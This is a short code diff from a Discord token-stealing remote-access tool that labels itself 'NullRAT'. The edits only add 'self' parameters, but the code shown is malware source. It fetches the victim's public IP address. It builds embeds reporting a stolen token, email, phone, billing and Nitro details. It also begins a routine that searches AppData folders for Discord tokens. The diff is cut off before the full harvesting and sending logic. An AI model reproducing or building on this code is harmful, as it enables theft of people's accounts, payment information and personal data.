@@ -14,7 +14,7 @@ def IP():
     try: return requests.get("https://api.ipify.org").text.rstrip()
     except: return "127.0.0.1"
 
-def genEmbed(title, timestamp, description=None):
+def genEmbed(self, title, timestamp, description=None):
     if description is None:
         embed = discord.Embed(
             title=title, 
@@ -29,7 +29,7 @@ def genEmbed(title, timestamp, description=None):
     embed.set_footer( text="NullRAT" )
     return embed
         
-def checked_embeds(token, email, phone, username, nitro, billing, avatar, userID):
+def checked_embeds(self, token, email, phone, username, nitro, billing, avatar, userID):
     embed=discord.Embed(title="Token Info:")
     embed.set_author(name="NullCode1337", url="https://github.com/NullCode1337")
     embed.set_thumbnail(url=avatar)
@@ -42,7 +42,7 @@ def checked_embeds(token, email, phone, username, nitro, billing, avatar, userID
     embed.add_field(name="Email", value=email, inline=False)
     return embed
 
-def find_token():
+def find_token(self):
     tokens = realTokens = []
     local, roaming = os.getenv("LOCALAPPDATA"), os.getenv("APPDATA")
     paths = {
